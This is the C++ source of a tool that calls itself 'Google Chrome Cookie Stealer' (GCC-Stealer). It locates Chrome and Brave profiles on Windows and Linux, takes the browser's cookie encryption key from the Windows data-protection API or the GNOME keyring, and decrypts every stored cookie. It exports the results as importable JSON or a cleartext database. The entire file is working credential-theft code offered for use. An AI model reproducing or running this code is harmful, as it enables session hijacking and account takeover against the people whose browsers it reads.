#include <filesystem>
#include <tuple>
#include <vector>
#include <list>
#include <string>
#include <iostream> 
#include <memory>
#include <fstream>

#include <sqlite3.h>
#include <jsoncons/json.hpp>
#include <argparse/argparse.hpp>


#ifdef _WIN32
    #include "base64.hpp"
    #include <Windows.h>
    #include <Lmcons.h>
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment (lib, "crypt32")
    #define ITERATION     1 
    #define PATH_MAX MAX_PATH
#elif __APPLE_
    #define ITERATION     1003 
#elif __linux__
    #define __STDC_WANT_LIB_EXT1__ 1 // memcpy_s
    #define ITERATION     1 
    #include <libsecret/secret.h>
    #include <string.h>
    #include <list>
#endif // _WIN32


#include <openssl/evp.h>
#include <openssl/aes.h>

#define KEY_LEN      16

#define GCC_STEALER_VERSION "1.1"

#ifdef _WIN32
// old "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies"
#define PATH_COOKIES_ON_PROFILE "Network\\Cookies"
#define CHROME_COOKIES_PATH "C:\\Users\\%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" 
#elif __APPLE_
#define PATH_COOKIES_ON_PROFILE "Cookies"
#define CHROME_COOKIES_PATH "%s/Library/Application Support/Google/Chrome/Default/Cookies"
#elif __linux__
#define PATH_COOKIES_ON_PROFILE "Cookies"
#define CHROME_COOKIES_PATH "%s/.config/google-chrome/Default/Cookies"
#endif //_WIN32


std::vector<std::string> possibleBrowserPaths = {
#ifdef _WIN32
    "C:\\Users\\%s}\\AppData\\Local\\Google\\Chrome\\User Data\\",
    "C:\\Users\\%s\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\"
#elif __APPLE_
    "%s/Library/Application Support/Google/Chrome/",
    "%s/Library/Application Support/BraveSoftware"
#elif __linux__
    "%s/.config/google-chrome/",
    "%s/.config/chromium/",
    "%s/.config/BraveSoftware/"
#endif //_WIN32
};

namespace fs = std::filesystem;

static bool quiet = false;
static argparse::ArgumentParser programArgs;

using cookie_vector_t = std::vector<std::tuple<std::string, std::string, std::vector<unsigned char>, std::string>>;

cookie_vector_t get_encrypted_cookies_vector(std::string_view db_path) {
    
    sqlite3* DB;
    auto sol_vector = cookie_vector_t();

    if (sqlite3_open_v2(db_path.data(), &DB, SQLITE_OPEN_READONLY, NULL)) {
        std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
        exit(-1);
    }
    else
        std::cout << "Opened Database Successfully!" << std::endl;
    
    sqlite3_stmt* statement;

    const char* sql = "SELECT host_key, name, encrypted_value from cookies;";
    auto a = sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0);
    if (sqlite3_prepare_v2(DB, sql, strlen(sql), &statement, 0) != SQLITE_OK)
    {
        std::cerr << "Open database failed\n" << std::endl;
        exit(-1);
    }

    int result = 0;
    while (true)
    {
        result = sqlite3_step(statement);

        if (result == SQLITE_ROW)
        {
            const char* host_key = (const char*)sqlite3_column_text(statement, 0);
            const char* cookie_name = (const char*)sqlite3_column_text(statement, 1);

            // Get the size of the vector
            int size = sqlite3_column_bytes(statement, 2);
            if (size == 0)
                continue;

            // Get the pointer to data
            unsigned char* p = (unsigned char*)sqlite3_column_blob(statement, 2);

            // Initialize the vector with the data
            std::vector<unsigned char> encrypted_value(p, p + size);

            std::string signature(encrypted_value.begin(), encrypted_value.begin() + 3);
            if (signature == "v10" || signature == "v11") {
                encrypted_value.erase(encrypted_value.begin(), encrypted_value.begin() + 3);
                sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
            }
            else {
                sol_vector.push_back(make_tuple(host_key, cookie_name, encrypted_value, ""));
            }

        }
        else
        {
            break;
        }
    }

    sqlite3_finalize(statement);
    sqlite3_close(DB);
    return sol_vector;
}



#ifdef __linux__
std::list<std::string> name_values_;
void Append(GHashTable* attrs_, const std::string& name, const std::string& value) {
    name_values_.push_back(name);
    gpointer name_str = static_cast<gpointer>(const_cast<char*>(name_values_.back().c_str()));
    name_values_.push_back(value);
    gpointer value_str = static_cast<gpointer>(const_cast<char*>(name_values_.back().c_str()));
    g_hash_table_insert(attrs_, name_str, value_str);
}


SecretValue* ToSingleSecret(GList* secret_items) {
    GList* first = g_list_first(secret_items);
    if (first == nullptr)
        return nullptr;
    if (g_list_next(first) != nullptr) {
        //std::cout << "OSCrypt found more than one encryption keys.";
    }
    SecretItem* secret_item = static_cast<SecretItem*>(first->data);
    SecretValue* secret_value = secret_item_get_secret(secret_item);
    return secret_value;
}
#endif


//void aes_init()
//{
//    static int init = 0;
//    if (init == 0)
//    {
//        //EVP_CIPHER_CTX e_ctx, d_ctx;
//
//        //initialize openssl ciphers
//        OpenSSL_add_all_ciphers();
//    }
//}

std::string aes_256_gcm_decrypt(std::vector<unsigned char> ciphertext, std::string key)
{

    constexpr size_t kNonceLength = 12;

    unsigned char tag[AES_BLOCK_SIZE];
    unsigned char nonce[kNonceLength];

    std::copy(ciphertext.begin(), ciphertext.begin() + 12, nonce);
    std::copy(ciphertext.end() - 16, ciphertext.end(), tag);

    std::vector<unsigned char> plaintext;
    plaintext.resize(ciphertext.size(), '\0');

    int actual_size = 0, final_size = 0;
    EVP_CIPHER_CTX* d_ctx = EVP_CIPHER_CTX_new();
    auto a = EVP_DecryptInit(d_ctx, EVP_aes_256_gcm(), (const unsigned char*)key.c_str(), nonce);
    auto b = EVP_DecryptUpdate(d_ctx, &plaintext[0], &actual_size, &ciphertext[kNonceLength], ciphertext.size()  - sizeof(tag) - sizeof(nonce));
    auto c = EVP_CIPHER_CTX_ctrl(d_ctx, EVP_CTRL_GCM_SET_TAG, 16, tag);
    if (!EVP_DecryptFinal(d_ctx, &plaintext[actual_size], &final_size)) {
        std::cerr << "[!] Error decrypting cookie" << std::endl;
    }

    EVP_CIPHER_CTX_free(d_ctx);
    plaintext.resize(actual_size + final_size, '\0');

    return std::string(plaintext.begin(), plaintext.end());
}


#ifndef _WIN32
std::string derive_key(std::string pwd)
{
    size_t i;
    std::string ret = "";
    unsigned char* out;
    unsigned char salt_value[] = { 's', 'a', 'l', 't', 'y', 's' , 'a', 'l', 't' };

    out = (unsigned char*)malloc(sizeof(unsigned char) * KEY_LEN);

    printf("pass: %s\n", pwd.c_str());
    printf("ITERATION: %u\n", ITERATION);
    printf("salt: "); for (i = 0; i < sizeof(salt_value); i++) { printf("%02x", salt_value[i]); } printf("\n");

    if (PKCS5_PBKDF2_HMAC_SHA1(pwd.c_str(), pwd.size(), salt_value, sizeof(salt_value), ITERATION, KEY_LEN, out) != 0)
    {
        printf("out: "); for (i = 0; i < KEY_LEN; i++) { printf("%02x", out[i]); } printf("\n");
        ret = std::string((char*)out, KEY_LEN);
    }
    else
    {
        fprintf(stderr, "PKCS5_PBKDF2_HMAC_SHA1 failed\n");
    }

    free(out);

    return ret;
}

std::string AES_Decrypt_String(std::string const& data, std::string const& key, std::vector<unsigned char> const& iVec)
{
    if (data.empty() || key.empty())
        return data;

    unsigned char decryptionIvec[AES_BLOCK_SIZE];
    memcpy(decryptionIvec, &iVec[0], AES_BLOCK_SIZE);

    AES_KEY AESkey;
    AES_set_decrypt_key((unsigned const char*)key.c_str(), key.size() * 8, &AESkey);
    unsigned char buffer[AES_BLOCK_SIZE];
    std::string value;

    for (unsigned int i = 0; i < data.size(); i += AES_BLOCK_SIZE)
    {
        AES_cbc_encrypt((unsigned const char*)data.c_str() + i, buffer, AES_BLOCK_SIZE, &AESkey, decryptionIvec, AES_DECRYPT);
        value.resize(value.size() + AES_BLOCK_SIZE);
        memcpy(&value[i], buffer, AES_BLOCK_SIZE);
    }

    /* Clean Strip padding from decrypted value.
     Remove number indicated by padding
         e.g. if last is '\x0e' then ord('\x0e') == 14, so take off 14. */

    return value.erase(value.size() - (int)value.back());
}
#endif

std::string get_key() {
#ifdef _WIN32
    fs::path cookies_path_user;
    if (programArgs.is_used("--cookies-path")) {
        cookies_path_user = fs::path(programArgs.get<std::string>("--cookies-path"));
    }
    else {
        char username[UNLEN + 1];
        DWORD username_len = UNLEN + 1;
        GetUserName(username, &username_len);
        char cookies_path[PATH_MAX] = { 0 };
        snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, username);
        cookies_path_user = fs::path(cookies_path);
    }

    auto local_state_file = (cookies_path_user.parent_path().parent_path().parent_path()) / fs::path("Local State");

    std::ifstream is(local_state_file); 
    if (!is.is_open()) {
        std::cerr << "Error opening " << local_state_file << std::endl;
        exit(-1);
    }
    
    try
    {
        jsoncons::json j = jsoncons::json::parse(is);
        auto encrypted_key = j["os_crypt"]["encrypted_key"].as<std::string>();
        
        auto decoded = base64_decode(encrypted_key);
        decoded.erase(decoded.begin(), decoded.begin() + 5);

        DATA_BLOB input;
        std::string plaintext;
        input.pbData = const_cast<BYTE*>(
            reinterpret_cast<const BYTE*>(decoded.data()));
        input.cbData = static_cast<DWORD>(decoded.size());

        DATA_BLOB output;
        if (!CryptUnprotectData(&input, nullptr, nullptr, nullptr, nullptr,
            0, &output)) {
            std::cerr << "[!] CryptUnprotectData failed decrypting encrypted_key" << std::endl;
            exit(-1);
        }
        return std::string(reinterpret_cast<char*>(output.pbData), output.cbData);

    }
    catch (const jsoncons::ser_error& e)
    {
        std::cout << e.what() << std::endl;
        exit(-1);
    }
    

#elif __APPLE_

#elif __linux__
    const SecretSchema kKeystoreSchemaV2 = {
        "chrome_libsecret_os_crypt_password_v2",
        SECRET_SCHEMA_DONT_MATCH_NAME,
        {
            {"application", SECRET_SCHEMA_ATTRIBUTE_STRING},
            {nullptr, SECRET_SCHEMA_ATTRIBUTE_STRING},
        }
    };

    GHashTable* attrs;
    attrs = g_hash_table_new_full(g_str_hash, g_str_equal,
        nullptr,   // no deleter for keys
        nullptr);  // no deleter for values
    Append(attrs, "application", "chrome");

    GError* error_ = nullptr;

    GList* results_ = nullptr;
    results_ = secret_service_search_sync(nullptr,  // default secret service
        &kKeystoreSchemaV2, attrs, static_cast<SecretSearchFlags>(SECRET_SEARCH_UNLOCK | SECRET_SEARCH_LOAD_SECRETS),
        nullptr,  // no cancellable object
        &error_);

    SecretValue * password_libsecret = ToSingleSecret(results_);
    if (password_libsecret == nullptr) {
        std::cerr << "[!] Error accessing gnome keyring. Is the user logged in (check who)?\n" << std::endl;
        exit(-1);
    }


    std::string key(secret_value_get_text(password_libsecret));

    printf("The Key is %s\n", key.c_str());

    // Derive key to get encryption key
    auto derived_key = derive_key(key);

    if (derived_key.empty()) {
        std::cerr << "[!] Error deriving key" << std::endl;
        exit(-1);
    }
    return derived_key;
    
#endif
    return "";
}

std::string decryptCookie(std::vector<unsigned char> ciphertext, std::string encryptionKey) {
#ifdef _WIN32
    return aes_256_gcm_decrypt(ciphertext, encryptionKey);
#else
    return AES_Decrypt_String(std::string(ciphertext.begin(), ciphertext.end()), encryptionKey, std::vector<unsigned char>(AES_BLOCK_SIZE, 0x20));
#endif
}

void decrypt_cookies(cookie_vector_t* cookie_vector)
{
    jsoncons::json allCookies(jsoncons::json_array_arg);

    // Get key. This is OS dependent
    auto encryptionKey = get_key();
    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : *cookie_vector) {
        decrypted_value = decryptCookie(encrypted_value, encryptionKey);
        
        if (programArgs.is_used("--json-print") || programArgs.is_used("--json-file")) {
            jsoncons::json cookieJSON;
            cookieJSON["domain"] = host_key;
            cookieJSON["name"] = cookie_name;
            cookieJSON["value"] = decrypted_value;
            allCookies.push_back(std::move(cookieJSON));
        }
    }

    if (programArgs.is_used("--json-print")) {
        std::cout << jsoncons::pretty_print(allCookies) << std::endl;
    }
    
    if (programArgs.is_used("--json-file")) {
        auto out = programArgs.get<std::string>("--json-file");
        std::ofstream fsi(out);
        allCookies.dump_pretty(fsi);
        fsi.close();
    } 
}

/* This function sets value with the decrypted value and empties encrypted_value*/
int update_decrypted_DB(cookie_vector_t& cookie_vector, std::string_view db_path) {
    sqlite3* DB;
    
    char sql[4000];

    int exit = 0;
    exit = sqlite3_open(db_path.data(), &DB);
    char* zErrMsg = 0;

    if (exit) {
        std::cerr << "Error open DB " << sqlite3_errmsg(DB) << std::endl;
        return -1;
    }
    else {
        std::cout << "Updating DB rows with decrypted values. This may take a while..." << std::endl;
    }

    /* Create merged SQL statement */
    auto format = "UPDATE cookies SET value = '%s', encrypted_value = '' WHERE host_key='%s' AND name='%s'";

    for (auto& [host_key, cookie_name, encrypted_value, decrypted_value] : cookie_vector) {
        snprintf(sql, sizeof(sql), format, decrypted_value.c_str(), host_key.c_str(), cookie_name.c_str());

        auto rc = sqlite3_exec(DB, sql, NULL, NULL, &zErrMsg);
    }

    sqlite3_close(DB);

    return 0;
}

int cbSelect(void* data, int ncols, char** values, char** headers)
{
    std::cout << ncols << " " << values << std::endl;
    return 0;
}

int alter_cookies_table(std::string_view db_path) {
    sqlite3* DB;

    const char* sql = R"V0G0N(PRAGMA foreign_keys=off;

    ALTER TABLE cookies RENAME TO _cookies_old;

    CREATE TABLE "cookies" (
	    "creation_utc"	INTEGER NOT NULL,
	    "host_key"	TEXT NOT NULL,
	    "top_frame_site_key"	TEXT NOT NULL,
	    "name"	TEXT NOT NULL,
	    "value"	TEXT NOT NULL,
	    "encrypted_value"	BLOB,
	    "path"	TEXT NOT NULL,
	    "expires_utc"	INTEGER NOT NULL,
	    "is_secure"	INTEGER NOT NULL,
	    "is_httponly"	INTEGER NOT NULL,
	    "last_access_utc"	INTEGER NOT NULL,
	    "has_expires"	INTEGER NOT NULL,
	    "is_persistent"	INTEGER NOT NULL,
	    "priority"	INTEGER NOT NULL,
	    "samesite"	INTEGER NOT NULL,
	    "source_scheme"	INTEGER NOT NULL,
	    "source_port"	INTEGER NOT NULL,
	    "is_same_party"	INTEGER NOT NULL,
	    "last_update_utc"	INTEGER NOT NULL
    );

    INSERT INTO cookies ("creation_utc","expires_utc","has_expires","host_key","is_httponly","is_persistent","is_same_party","is_secure","last_access_utc","last_update_utc","name","path","priority","samesite","source_port","source_scheme","top_frame_site_key","value")
      SELECT "creation_utc","expires_utc","has_expires","host_key","is_httponly","is_persistent","is_same_party","is_secure","last_access_utc","last_update_utc","name","path","priority","samesite","source_port","source_scheme","top_frame_site_key","value"
      FROM _cookies_old;

    PRAGMA foreign_keys=on;)V0G0N";

    if (sqlite3_open_v2(db_path.data(), &DB, SQLITE_OPEN_READWRITE, NULL)) {
        std::cerr << "Error opening DB " << sqlite3_errmsg(DB) << std::endl;
        exit(-1);
    }
    else {
        std::cout << "Updating encrypted_value column so it can hold NULL" << std::endl;
    }
  
    char* zErrMsg = NULL;
    if (SQLITE_OK != sqlite3_exec(DB, sql, cbSelect, NULL, &zErrMsg)) {
        std::cout << "[!!] Error changing altering encrypted_value column to accept NULL. " << zErrMsg << std::endl;
        exit(-1);
    }

    if (SQLITE_OK != sqlite3_close(DB)) {
        std::cout << "[!!] Error closing DB" << std::endl;
        exit(-1);
    }

    return 0;
}


void argsHandling(int argc, char** argv) {
    programArgs = argparse::ArgumentParser("GCC-stealer.exe", GCC_STEALER_VERSION);

    programArgs.add_description("Google Chrome Cookie Stealer (GCC-Stealer)");
    programArgs.add_epilog("It must be run on the same system you want to decrypt the cookies from");

    programArgs.add_argument("--json-print")
        .help("print a JSON structure with the decrypted cookies you can import in Cookie-Editor")
        .default_value(false)
        .implicit_value(true);

    programArgs.add_argument("--json-file")
        .help("create a JSON file with the decrypted cookies you can import in Cookie-Editor")
        .default_value(std::string{ "cookies.json" });

    programArgs.add_argument("--cookies-out")
        .help("path where to write decrypted cookies DB to")
        .default_value(std::string{ "Cookies_decrypted" });

    programArgs.add_argument("--cookies-path")
        .help("tell GCC-Stealer where to look for the cookies DB");


    try {
        programArgs.parse_args(argc, argv);

    }
    catch (const std::runtime_error& err) {
        std::cerr << err.what() << std::endl;
        std::cerr << programArgs;
        std::exit(1);
    }
}


std::vector<fs::path> findChrome(std::vector<std::string> defaultCookiesPath, std::string username) {
    std::vector<fs::path> res;

    for (auto const& path : defaultCookiesPath) {
        char path_user[PATH_MAX] = { 0 };
        snprintf(path_user, PATH_MAX, path.c_str(), username);

        if (fs::exists(path_user)) {
            for (const auto& dirEntry : fs::directory_iterator(path_user, fs::directory_options::skip_permission_denied)) {
                if (fs::exists(dirEntry / fs::path("Web Data")) && // Cookies is in different places in Windows than in Linux/OSX
                    dirEntry.path().filename() != "System Profile")
                {
                    res.push_back(dirEntry);
                    std::cout << "Found Chrome Profile at " << dirEntry.path() << std::endl;
                    std::cout << "You can rerun GCC-stealer with --cookies-path " << dirEntry.path() / fs::path(PATH_COOKIES_ON_PROFILE) << " to decrypt it" << std::endl;
                }
            }
        }
    }
    
    return res;
}


int main(int argc, char** argv) 
{
    argsHandling(argc, argv);

#ifdef _WIN32
    char username[UNLEN + 1];
    DWORD username_len = UNLEN + 1;
    GetUserName(username, &username_len);
#else
    auto username = getenv("HOME");    
#endif //_WIN32
    char cookies_path[PATH_MAX] = { 0 };
    
    // Find profiles and other Chrome based browsers
    [[maybe_unused]] auto possibleCookies = findChrome(possibleBrowserPaths, username);
    
    if (programArgs.is_used("--cookies-path")) {
        auto user_provided_cookies_path = programArgs.get<std::string>("--cookies-path");
        if (user_provided_cookies_path.size() > PATH_MAX) {
            std::cerr << "Path lenght should be less than " << PATH_MAX << std::endl;
            exit(-1);
        }
        memcpy(cookies_path, user_provided_cookies_path.c_str(), user_provided_cookies_path.size());
    }
    else {
        snprintf(cookies_path, PATH_MAX, CHROME_COOKIES_PATH, username);
    }

    if (!fs::path(cookies_path).has_filename()) {
        std::cerr << "Make sure that " << cookies_path << " exists in the system or try option --cookies-path and set it to the DB" << std::endl;
        exit(-1);
    }    
    
    std::cout << "Using \"" << cookies_path << "\" as target to decrypt cookies" << std::endl;

    // Open Chrome/Brave DB
    auto cookies_vector = get_encrypted_cookies_vector(cookies_path);
    
    if (cookies_vector.empty()) {
        std::cerr << "[!] Couldn't get cookies values" << std::endl;
        return -1;
    }

    decrypt_cookies(&cookies_vector);

    
    // Option to create a decrypted version of the sqlite DB
    if (programArgs.is_used("--cookies-out")) {
        std::string out_cookies = programArgs.get<std::string>("--cookies-out");
        std::error_code err;
        fs::copy(cookies_path, out_cookies, std::filesystem::copy_options::overwrite_existing, err);
        
        if (err) {
            std::cout << "[!!] Couldn't copy " << cookies_path << " to " << out_cookies << " . Error: " << err.message() << std::endl;
            return -1;
        }

        // Modify cookies table so encrypted_value can be NULL
        alter_cookies_table(out_cookies);

        // Update out cookies DB with the decrypted values of the cookies
        if (update_decrypted_DB(cookies_vector, out_cookies) == 0) {
            std::cout << "Database " << out_cookies << " updated with cleartext cookie values" << std::endl;
        }
        else {
            std::cerr << "[!!] Some error occured while creating cleartext Cookies DB" << std::endl;
            return -1;
        }
    }

    return 0;
}